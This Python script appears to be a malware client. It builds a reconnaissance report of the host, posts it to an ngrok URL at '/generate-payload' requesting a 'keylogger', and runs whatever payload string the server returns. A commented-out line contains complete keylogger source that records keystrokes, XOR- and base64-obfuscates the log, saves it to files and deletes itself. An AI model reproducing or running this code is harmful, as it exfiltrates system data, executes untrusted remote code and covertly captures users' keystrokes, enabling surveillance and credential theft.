
import sys
import requests  
import recon, execute

API_URL = "https://22fd-14-99-167-142.ngrok-free.app/generate-payload"
PAYLOAD_TYPE = "keylogger"


def post_report(report_str: str) -> requests.Response:
    payload = {"malware_type": PAYLOAD_TYPE, "report": report_str}
    headers = {"Content-Type": "application/json"}
    resp = requests.post(API_URL, json=payload, headers=headers)
    return resp
def main() -> None:
    report_str = recon.build_continuous_report()

    try:
        # print(report_str)
        resp = post_report(report_str)
        print("Server responded:", resp.status_code)
        print(resp.text)

        # Check if the response is JSON
        try:
            data = resp.json()
        except ValueError:
            print("[!] Response is not valid JSON.")
            return

        # Check for 'payload' key
        if "payload" not in data:
            print("[!] JSON does not contain 'payload' key.")
            return

        # Check that 'payload' is a string
        payload = data["payload"]
        # payload = 'import keyboard\nimport time\nimport base64\nimport os\nimport sys\n\ndef xor_encrypt(data, key):\n    key = str(key)\n    l = len(key)\n    encrypted = bytearray()\n    for i in range(len(data)):\n        encrypted.append(data[i] ^ ord(key[i % l]))\n    return bytes(encrypted)\n\ndef log_keystrokes():\n    log = ""\n    while True:\n        event = keyboard.read_event()\n        if event.event_type == keyboard.KEY_DOWN:\n            log += event.name\n            if event.name == "esc":\n                break\n    return log.encode("utf-8")\n\ndef save_and_obfuscate_log(log_data):\n    key = time.time()\n    encrypted_data = xor_encrypt(log_data, key)\n    encoded_data = base64.b64encode(encrypted_data)\n    with open("temp_log.txt", "wb") as f:\n        f.write(encoded_data)\n    with open("temp_key.txt", "w") as f:\n        f.write(str(key))\n\ndef delete_self():\n    try:\n        os.remove(sys.argv[0])\n    except Exception as e:\n        pass\n\nif name == "main":\n    log = log_keystrokes()\n    save_and_obfuscate_log(log)\n    delete_self()\n'
        if not isinstance(payload, str):
            print("[!] 'payload' is not a string.")
            return

        status, result = execute.run_with_retry(payload)

        if not status:
            print("[x] Execution failed. Error:\n", result)
            sys.exit(1)

    except requests.RequestException as e:
        print("[!] Network or request error:", e)

    except Exception as e:
        print("[!] Unexpected error:", e)
    

if __name__ == "__main__":
    main()
